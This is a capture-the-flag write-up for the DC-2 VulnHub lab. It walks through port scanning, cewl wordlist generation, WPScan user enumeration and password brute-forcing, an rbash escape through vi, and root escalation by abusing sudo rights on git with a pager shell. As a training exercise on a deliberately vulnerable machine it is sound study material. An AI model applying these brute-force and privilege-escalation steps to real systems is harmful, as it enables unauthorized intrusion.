#DC-2 Penetration Testing Report**Target:** DC-2 (VulnHub)
**Objective:** Gain root access and capture all flags.

---

##1. Reconnaissance & Network ScanningWe began by identifying the target IP address and performing a comprehensive port scan to discover running services.

**Command Executed:**

```bash
nmap -A -p- 192.168.56.108

```

**Technical Breakdown:**

* **`nmap`**: The Network Mapper tool used for discovery.
* **`-p-`**: This is a crucial flag. Instead of scanning only the top 1000 common ports, this forces Nmap to scan **all 65,535 ports**. This allowed us to discover the non-standard SSH port (`7744`).
* **`-A`**: Enables "Aggressive" scan options. It combines OS detection (`-O`), version detection (`-sV`), script scanning (`-sC`), and traceroute. This gives us maximum information about the services running (e.g., Apache version, Debian OS).

**Findings:**

* **Port 80 (HTTP):** Running Apache/2.4.10. The script detected a redirect to `http://dc-2/`.
* **Port 7744 (SSH):** Running OpenSSH 6.7p1. Note that SSH is running on a high, non-standard port.

**Action Taken:**
Since the web server redirects to a domain name, we modified our local DNS mapping to access the site.

* **File Edited:** `/etc/hosts`
* **Entry Added:** `192.168.56.108 dc-2`

---

##2. Web Enumeration & Wordlist GenerationUpon accessing the website (WordPress), we needed to gather intelligence to prepare for a brute-force attack. Since standard wordlists (like `rockyou.txt`) might not be effective for specific targets, we generated a custom dictionary.

**Command Executed:**

```bash
cewl -v http://dc-2/ -w cewl.out

```

**Technical Breakdown:**

* **`cewl`**: (Custom Word List generator) A ruby app that spiders a URL to a specified depth and returns a list of words found on the page.
* **`-v`**: Verbose mode. Displays the spidering process in real-time, showing which pages are being visited.
* **`-w cewl.out`**: Writes the output (the gathered words) to a file named `cewl.out`.
* **Result:** We renamed this file to `passwords` for clarity (`mv cewl.out passwords`).

---

##3. Vulnerability Scanning & Brute-ForceWe used **WPScan**, a specialized WordPress vulnerability scanner, to identify users and perform a password attack using our custom wordlist.

**Step A: Enumerating Users**

```bash
wpscan --url http://dc-2/ --enumerate u

```

* **`--enumerate u`**: This flag instructs the tool to iterate through user IDs (1-10) to extract valid usernames.
* **Result:** Found users `admin`, `jerry`, `tom`. We saved these into a file named `users`.

**Step B: Brute-Forcing Passwords**

```bash
wpscan --url http://dc-2/ -v --disable-tls-checks -U users -P passwords

```

**Technical Breakdown:**

* **`--url`**: Specifies the target WordPress site.
* **`--disable-tls-checks`**: Prevents the scanner from aborting if the SSL certificate is invalid (common in CTF labs).
* **`-U users`**: Specifies the list of valid usernames we found.
* **`-P passwords`**: Specifies the custom wordlist we generated with `cewl`.
* **Attack Vector:** XML-RPC brute force.

**Findings:**
We successfully cracked two accounts:

1. **jerry** / `adipiscing`
2. **tom** / `parturient`

---

##4. Initial Access & Escaping Restricted Shell (rbash)We attempted to log in via SSH using the discovered credentials.

**Command Executed:**

```bash
ssh -p 7744 tom@dc-2

```

* **`-p 7744`**: Specifically targets the non-standard port discovered during reconnaissance.

**The Obstacle:**
Upon logging in as `tom`, we were placed in a **Restricted Bash (rbash)** environment.

* Commands like `cd`, `cat`, `su`, and `export` were blocked.
* The environment variable `$PATH` was restricted to `/home/tom/usr/bin`.

**The Escape Technique:**
We discovered that the text editor `vi` was available. We utilized a known escape technique where a text editor is used to spawn a system shell.

1. **Run Vi:** Typed `vi` to open the editor.
2. **Shell Command:** Inside `vi`, we typed `:set shell=/bin/bash` followed by `:shell`. This forces the editor to launch a standard bash shell, breaking out of the restricted environment.
3. **Environment Stabilization:**
Once out, the shell was still unstable because the `PATH` variable was empty. We fixed this by manually exporting the standard Linux binary paths:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```



**Result:** Full user access as `tom`. We accessed `flag3.txt`.

---

##5. Lateral Movement (Tom → Jerry)We used the credentials found earlier to switch users, as `tom` did not have sudo privileges.

**Command:**

```bash
su jerry

```

* **Password:** `adipiscing`
* **Result:** We obtained access to `flag4.txt` in Jerry's home directory.

---

##6. Privilege Escalation (Root)To escalate to root, we checked Jerry's sudo permissions.

**Command:**

```bash
sudo -l

```

**Finding:**

```
User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

```

This indicates a serious misconfiguration. The user `jerry` can run the `git` command as `root` without entering a password.

**The Exploit (GTFOBins):**
Git has a feature called a "pager" (used to scroll through help pages or logs). If the window is too small to fit the text, Git invokes a pager (like `less`). We can abuse this to run system commands.

**Command Executed:**

```bash
sudo git -p help config

```

* **`sudo`**: Run as root.
* **`-p`**: Forces the use of a pager (even if the output fits on the screen).
* **`help config`**: Opens the help manual.

**Execution:**

1. The command opened the manual page in the pager.
2. At the bottom of the screen, we typed `!/bin/sh` and pressed Enter.
* **`!`**: In `less`/`vi` pagers, the exclamation mark tells the system to "execute a shell command".
* **`/bin/sh`**: The command we executed was to spawn a new shell.


3. Since `git` was running as root (via sudo), the spawned shell also possessed root privileges.

**Final Outcome:**
We successfully gained a `#` root prompt. We navigated to `/root` and retrieved the final flag.

```bash
cd /root
cat final-flag.txt

```

---

###ConclusionThis lab demonstrated the importance of:

1. **Scanning all ports** (`-p-`) to find hidden services.
2. **Context-aware password attacks** (using `cewl` instead of generic lists).
3. **Restricted Shell escapes** (using misconfigured utilities like `vi`).
4. **Sudo privilege auditing** (exploiting `git` permissions).